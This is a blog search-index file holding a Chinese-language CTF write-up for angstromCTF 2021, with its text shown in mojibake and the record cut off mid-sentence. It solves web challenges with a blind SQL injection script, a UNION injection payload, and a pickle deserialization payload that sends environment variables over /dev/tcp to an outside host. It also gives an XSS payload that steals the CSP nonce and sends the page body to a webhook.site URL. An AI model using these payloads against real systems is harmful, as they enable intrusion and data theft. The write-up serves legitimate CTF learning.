<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>angstromCTF 2021</title>
      <link href="2021/04/04/angstromCTF-2021/"/>
      <url>2021/04/04/angstromCTF-2021/</url>
      
        <content type="html"><![CDATA[<p>  æ”¾å‡æ—¶åšäº†ä¸‹ angstromCTFçš„é¢˜ç›®, è´¨é‡éƒ½æŒºä¸é”™çš„ã€‚è¿™é‡Œè®°å½•ä¸‹è‡ªå·±åšå‡ºæ¥çš„é¢˜ç›®ä»¥åŠå¤ç°çš„ã€‚</p><a id="more"></a><p>  (åè§‚æŸå›½å†…æ¯”èµ›æ™ºéšœè„‘æ´é¢˜, çœŸçš„æ— è¯­</p><h2 id="Sea-of-Quills"><a href="#Sea-of-Quills" class="headerlink" title="Sea of Quills"></a>Sea of Quills</h2><p>  é¢˜ç›®ç»™äº†ruby æºç ã€‚ æœ‰å¾ˆæ˜æ˜¾çš„æ³¨å…¥ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">"-"</span>, <span class="string">"/"</span>, <span class="string">";"</span>, <span class="string">"'"</span>, <span class="string">"\""</span>]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line">    <span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br></pre></td></tr></table></figure><p>åŸºæœ¬æ²¡waf. ç›´æ¥å­æŸ¥è¯¢æŸ¥è¡¨å,å†ä»flagtableæŸ¥flagå³å¯<br><code>col=(select flag from flagtable)</code></p><h2 id="Sea-of-Quills2"><a href="#Sea-of-Quills2" class="headerlink" title="Sea of Quills2"></a>Sea of Quills2</h2><p>ç¬¬äºŒç‰ˆå°±å¾ˆæœ‰æ„æ€äº†ã€‚åŠ ä¸Šäº†çœ‹ä¼¼éå¸¸ä¸¥æ ¼çš„waf. colé•¿åº¦ä¸èƒ½è¶…è¿‡24.limit ä¸offsetéœ€è¦ä¸ºæ•°å­—ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">"-"</span>, <span class="string">"/"</span>, <span class="string">";"</span>, <span class="string">"'"</span>, <span class="string">"\""</span>, <span class="string">"flag"</span>]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line">    <span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cols.length &gt; <span class="number">24</span> <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br></pre></td></tr></table></figure><p>è¦çŸ¥é“<code>select*fromsqlite_master</code>æ‰24å­—æ¯ã€‚å°±æ˜¯è¯´å­æŸ¥è¯¢è‚¯å®šä¸å¯è¡Œã€‚é‚£ä¹ˆè¦å¦‚ä½•æ³¨å…¥å‘¢?</p><p>è¿™æ—¶æˆ‘æƒ³èµ·å»å¹´åšè¿‡çš„zer0pts2020 é‡Œçš„urlapp, ä¸€é“åˆ©ç”¨urlæ‰“redis æ”¹é”®åè¯»é”®åçš„é¢˜ç›®ã€‚é‚£é“é¢˜çš„æœ‰è¶£ä¹‹å¤„åœ¨äºä½¿ç”¨<code>BITOP</code>è¿›è¡ŒæŒ‰ä½æ”¹, ç„¶è€Œæ¼æ´æ ¹æºå´æ˜¯ï¼Œrubyæ­£åˆ™çš„è„†å¼±æ€§å¯¼è‡´äº†å¯ä»¥ä¼ å…¥<code>\n</code>bypass æ­£åˆ™, ä»è€ŒSSRF æ‰“ redis.</p><p>æ‰€ä»¥æ­¤å¤„å”¯ä¸€å¯èƒ½ç»•è¿‡çš„åœ°æ–¹è‡ªç„¶æ˜¯limit ä¸offset. å½“æˆ‘fuzz limit ä¼ å…¥<code>\n</code>æ—¶,å‘ç°æ­£åˆ™ç¡®å®è¢«ç»•è¿‡äº†ã€‚è€Œä¸”é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜èƒ½åœ¨<code>\n</code>åä¼ å…¥ä»»æ„å­—ç¬¦è€Œä¸è¢«wafåŒ¹é…åˆ°ã€‚<br>(ä¹‹åäº†è§£åˆ°rubyæ­£åˆ™åªåŒ¹é…å•è¡Œ)</p><p>æ‰€ä»¥å°±æ˜¯ç›²æ³¨çš„äº‹äº†ã€‚æˆ‘ç”¨æ¯”è¾ƒåçˆ±çš„æŠ¥é”™åŒºåˆ†çŠ¶æ€ç æ¥æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://seaofquills-two.2021.chall.actf.co/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    print(j)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.post(url + <span class="string">'quills'</span>, data=&#123;</span><br><span class="line">            <span class="string">'cols'</span>: <span class="string">"(select 1)"</span>,</span><br><span class="line">            <span class="string">'limit'</span>: <span class="string">"2\n or abs(case when(substr((select flag from flagtable limit 1),"</span>+ str(j) +<span class="string">",1)='"</span> + i + <span class="string">"') then -9223372036854775808 else 0 end);"</span>,</span><br><span class="line">            <span class="string">"offset"</span>: <span class="string">"3"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">            res += i</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>åæ¥æƒ³èµ·æ¥ç›´æ¥union selectå°±è¡Œäº† .. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cols: &quot;* FROM(select name,desc&quot;</span><br><span class="line">limit: &quot;1&quot;</span><br><span class="line">offset: &quot;1\n) UNION SELECT flag, 1 FROM flagtable&quot;</span><br></pre></td></tr></table></figure><p>(æ‰€ä»¥è¿™é¢˜zer0pts æ‹¿ä¸€è¡€å¾ˆåˆç† 2333</p><h2 id="Jar"><a href="#Jar" class="headerlink" title="Jar"></a>Jar</h2><p>pickle ååºåˆ—åŒ–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">            cmd = [<span class="string">'bash'</span>, <span class="string">'-c'</span>, <span class="string">'echo $(env) &gt; /dev/tcp/xxx/9001 '</span>]</span><br><span class="line">            <span class="keyword">return</span> __import__(<span class="string">'subprocess'</span>).check_output, (cmd,)</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line">payload = b64(s).decode()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://jar.2021.chall.actf.co/add'</span></span><br><span class="line">r = requests.post(url, cookies=&#123;<span class="string">'contents'</span>: payload&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="nomnomnom"><a href="#nomnomnom" class="headerlink" title="nomnomnom"></a>nomnomnom</h2><p>é¢˜ç›®ç»™äº†æºç (ä¸è¿‡ï¼Œè²Œä¼¼ä¸ç»™æºç ä¹Ÿèƒ½åš)ã€‚å¯ä»¥é”å®šå…³é”®ä»£ç å‘ç°è¿™æ˜¯ä¸€é“xssé¢˜ç›®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/shares/:shareName'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> better page maybe...? would attract those sweet sweet vcbucks</span></span><br><span class="line"><span class="keyword">if</span> (!(req.params.shareName <span class="keyword">in</span> shares)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">'hey that share doesn\'t exist... are you a time traveller :O'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> share = shares[req.params.shareName];</span><br><span class="line"><span class="keyword">const</span> score = share.score;</span><br><span class="line"><span class="keyword">const</span> name = share.name;</span><br><span class="line"><span class="keyword">const</span> nonce = crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line"><span class="keyword">let</span> extra = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) &#123;</span><br><span class="line">extra = <span class="string">`deletion token: &lt;code&gt;<span class="subst">$&#123;process.env.FLAG&#125;</span>&lt;/code&gt;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res.send(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv='Content-Security-Policy' content="script-src 'nonce-<span class="subst">$&#123;nonce&#125;</span>'"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;snek nomnomnom&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;extra&#125;</span><span class="subst">$&#123;extra ? <span class="string">'&lt;br /&gt;&lt;br /&gt;'</span> : <span class="string">''</span>&#125;</span></span></span><br><span class="line"><span class="string">&lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">Check out this score of <span class="subst">$&#123;score&#125;</span>! &lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;a href='/'&gt;Play!&lt;/a&gt; &lt;button id='reporter'&gt;Report.&lt;/button&gt; &lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;br /&gt;</span></span><br><span class="line"><span class="string">This score was set by <span class="subst">$&#123;name&#125;</span></span></span><br><span class="line"><span class="string">&lt;script nonce='<span class="subst">$&#123;nonce&#125;</span>'&gt;</span></span><br><span class="line"><span class="string">function report() &#123;</span></span><br><span class="line"><span class="string">fetch('/report/<span class="subst">$&#123;req.params.shareName&#125;</span>', &#123;</span></span><br><span class="line"><span class="string">method: 'POST'</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">document.getElementById('reporter').onclick = () =&gt; &#123; report() &#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/report/:shareName'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!(req.params.shareName <span class="keyword">in</span> shares)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">'hey that share doesn\'t exist... are you a time traveller :O'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> visiter.visit(</span><br><span class="line">nothisisntthechallenge,</span><br><span class="line"><span class="string">`http://localhost:9999/shares/<span class="subst">$&#123;req.params.shareName&#125;</span>`</span></span><br><span class="line">);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åŒæ—¶æ³¨æ„åˆ°bot  ç”¨åˆ°çš„æ˜¯firefox çš„ puppeteer</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params">secret, url</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>], <span class="attr">product</span>: <span class="string">'firefox'</span> &#125;)</span><br><span class="line"><span class="keyword">var</span> page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"><span class="keyword">await</span> page.setCookie(&#123;</span><br><span class="line">name: <span class="string">'no_this_is_not_the_challenge_go_away'</span>,</span><br><span class="line">value: secret,</span><br><span class="line">domain: <span class="string">'localhost'</span>,</span><br><span class="line">samesite: <span class="string">'strict'</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">await</span> page.goto(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">// idk, race conditions!!! :D</span></span><br><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> setTimeout(resolve, <span class="number">500</span>));</span><br><span class="line"><span class="keyword">await</span> page.close()</span><br><span class="line"><span class="keyword">await</span> browser.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€è€Œè¨€ä¹‹ã€‚æˆ‘ä»¬ç°åœ¨å¯æ§<code>shares</code>é¡µé¢ä¸‹ç›´æ¥æ‹¼æ¥çš„scoreä¸name.ä½†æ˜¯é¡µé¢å­˜åœ¨CSP çš„nonce ä¸”nonceä¸ºåŠ¨æ€åˆ·æ–°. æˆ‘ä»¬å¯æ§ç‚¹åœ¨å«nounceçš„script æ­£ä¸Šæ–¹ã€‚</p><p>é¦–å…ˆå¯¹äºè¿™ä¸ªCSP, å…¶å®æ˜¯éå¸¸å¥‡æ€ªçš„ã€‚ä¸€èˆ¬æ¥è¯´è®¾ç½®script-nonce å¯èƒ½ä¼šå…ˆåŠ ä¸Š<code>script-src: &#39;self&#39;</code> <code>default-src: &#39;self&#39;</code> <code>base-uri: none</code> ä¹‹ç±»çš„ã€‚å…¶ä¸­ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯åœ¨æ²¡æœ‰<code>base-uri</code>çš„æƒ…å†µä¸‹å…ˆæ’å…¥baseæ ‡ç­¾å†æ’å…¥scipt(å¸¦nonce),è¾¾æˆxss; ä½†æ˜¯è¿™äº›è¦æ±‚nonceå¯æ§ï¼Œæ­¤å¤„è‡ªç„¶æ˜¯ä¸è¡Œçš„ã€‚</p><p>ä½†æ˜¯,æ³¨æ„åˆ°æˆ‘ä»¬å¯æ§çš„nameå°±åœ¨<code>script</code>æ ‡ç­¾æ­£ä¸Šæ–¹ï¼Œä¸€ä¸ªæœ´ç´ çš„æƒ³æ³•è‡ªç„¶æ˜¯ï¼Œæƒ³åŠæ³•è®©æˆ‘ä»¬çš„æ ‡ç­¾æŠŠä¸‹é¢çš„åæ‰ï¼Œå¹¶ä¸”nonce æ­£å¥½å¸¦è¿›å»å°±è¡Œäº†ã€‚<br><code>&lt;script  src=&#39;data:text/plain,alert(1)&#39; a=</code>å½“ç„¶èƒ½åè¿›å»ï¼Œæ­¤æ—¶åœ¨firefoxä¸‹å°±å·²ç»èƒ½xssäº†.ä½†æ˜¯chromeä¸‹å¯ä»¥ä¹ˆï¼Ÿä¸ºäº†é¿å…<code>&lt;</code>å­—ç¬¦çš„å½±å“,è¿™é‡Œæˆ‘å°è¯•äº†ä¸‹è®¾ç½®åŒåå±æ€§ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šå¿½ç•¥ç¬¬äºŒä¸ªåŒåå±æ€§ã€‚ç»“æœå‘ç°chromeä¸‹ç¡®å®è§¦å‘ä¸äº†,å°½ç®¡å·²ç»è§£ææˆæ­£ç¡®çš„ä»£ç äº†</p><p><img src="https://hackmd.summershrimp.com/uploads/upload_72be679263b1b5f2017fa0b2cf482064.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_72be679263b1b5f2017fa0b2cf482064.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åŸºäºé¢˜ç›®æ˜¯firefox,ç›´æ¥xssä¼ htmlä»£ç å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'record'</span>, json=&#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">"""&lt;script src="data:text/plain,location.href='https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234/?s'+btoa(document.body.innerHTML)" a=123 a="""</span>,</span><br><span class="line">        <span class="string">"score"</span>: <span class="number">44</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'report/376d2d58a518de7b'</span>)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure><h2 id="Reaction-py"><a href="#Reaction-py" class="headerlink" title="Reaction . py"></a>Reaction . py</h2><p>è¿™é¢˜åƒäº†ä¸ªæ²¡åŸŸåçš„äºã€‚ ä¸ç„¶å¾ˆå¿«å°±èƒ½å‡ºã€‚ã€‚ã€‚ğŸ˜¦</p><p>æœ¬é¢˜åŒæ ·æ˜¯xss.å…³é”®ä»£ç åœ¨äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_component</span><span class="params">(name, cfg, bucket)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name <span class="keyword">or</span> <span class="keyword">not</span> cfg:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Missing parameters"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(bucket) &gt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Bucket too large (our servers aren't very good :((((()"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(cfg) &gt; <span class="number">250</span>:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Config too large (our servers aren't very good :((((()"</span>)</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">"welcome"</span>:</span><br><span class="line">        <span class="keyword">if</span> len(bucket) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (ERR, <span class="string">"Welcomes can only go at the start"</span>)</span><br><span class="line">        bucket.append(</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            &lt;form action="/newcomp" method="POST"&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="text" name="name" placeholder="component name"&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="text" name="cfg" placeholder="component config"&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="submit" value="create component"&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action="/reset" method="POST"&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;warning: resetting components gets rid of this form for some reason&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="submit" value="reset components"&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action="/contest" method="POST"&gt;</span></span><br><span class="line"><span class="string">                &lt;div class="g-recaptcha" data-sitekey="&#123;&#125;"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="submit" value="submit site to contest"&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Welcome &lt;strong&gt;&#123;&#125;&lt;/strong&gt;!&lt;/p&gt;</span></span><br><span class="line"><span class="string">            """</span>.format(</span><br><span class="line">                captcha.get(<span class="string">"sitekey"</span>), escape(cfg)</span><br><span class="line">            ).strip()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> name == <span class="string">"char_count"</span>:</span><br><span class="line">        bucket.append(</span><br><span class="line">            <span class="string">"&lt;p&gt;&#123;&#125;&lt;/p&gt;"</span>.format(</span><br><span class="line">                escape(</span><br><span class="line">                    <span class="string">f"&lt;strong&gt;<span class="subst">&#123;len(cfg)&#125;</span>&lt;/strong&gt; characters and &lt;strong&gt;<span class="subst">&#123;len(cfg.split())&#125;</span>&lt;/strong&gt; words"</span></span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> name == <span class="string">"text"</span>:</span><br><span class="line">        bucket.append(<span class="string">"&lt;p&gt;&#123;&#125;&lt;/p&gt;"</span>.format(escape(cfg)))</span><br><span class="line">    <span class="keyword">elif</span> name == <span class="string">"freq"</span>:</span><br><span class="line">        counts = Counter(cfg)</span><br><span class="line">        (char, freq) = max(counts.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">        bucket.append(</span><br><span class="line">            <span class="string">"&lt;p&gt;All letters: &#123;&#125;&lt;br&gt;Most frequent: '&#123;&#125;'x&#123;&#125;&lt;/p&gt;"</span>.format(</span><br><span class="line">                <span class="string">""</span>.join(counts), char, freq</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Invalid component name"</span>)</span><br><span class="line">    <span class="keyword">return</span> (OK, bucket)</span><br></pre></td></tr></table></figure><p>name æœ‰å››ç§æ–¹å¼,éƒ½ä¼šæŠŠéƒ¨åˆ†htmlå¡å…¥<code>bucket</code>ã€‚æˆ‘ä»¬è®¿é—®é¡µé¢æ—¶bucketä¼šä½œä¸ºhtmlä»£ç è¿”å›ã€‚ç›®æ ‡æ˜¯xssæ‹¿åˆ°adminçš„bucketå†…å®¹</p><p>æ³¨æ„åˆ°ï¼Œå››ç§æ–¹å¼é‡Œåªæœ‰ä¸€ç§<code>freq</code>æ˜¯å¡å…¥çš„æ²¡æœ‰ç»è¿‡<code>escape</code>çš„ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´æƒ³åšåˆ°xss,å°±è¦å¡å…¥<code>&lt;</code>,ä¹Ÿå°±åªèƒ½é€‰è¿™æ¡è·¯äº†ã€‚</p><p>ä½†æ˜¯å…¶è¦æ±‚å¾ˆä¸¥è‹›ã€‚ä»–å›æ˜¾çš„æ˜¯<code>&quot;&quot;.join(counts) =&gt; &quot;&quot;.join(Counter(cfg))</code>ã€‚å°±æ˜¯è¯´æˆ‘ä»¬payloadä¸­é‡å¤çš„éƒ¨åˆ†ä¼šè¢«å»æ‰ã€‚æˆ‘ä»¬è¦å°è¯•<strong>æ²¡æœ‰é‡å¤å­—ç¬¦çš„</strong>xss. è¿‘ä¼¼è§£å†³çš„æƒ³æ³•è‡ªç„¶æ˜¯<code>&lt;script src=http://xxx/&gt;</code>ã€‚ä½†åƒåŸŸåæˆ–è€…å…¶ä»–ä½ç½®ä»ç„¶æœ‰é‡å¤å­—ç¬¦ã€‚</p><p>è¿™é‡Œæˆ‘å¾ˆå¿«æƒ³åˆ°ä¸€ä¸ªå¾ˆè‘—åçš„é—®é¢˜ <a href="http://www.unicode.org/reports/tr46/" target="_blank" rel="noopener">http://www.unicode.org/reports/tr46/</a>ã€‚ä¹Ÿå°±æ˜¯ä¸åŒå­—ç¬¦é€ 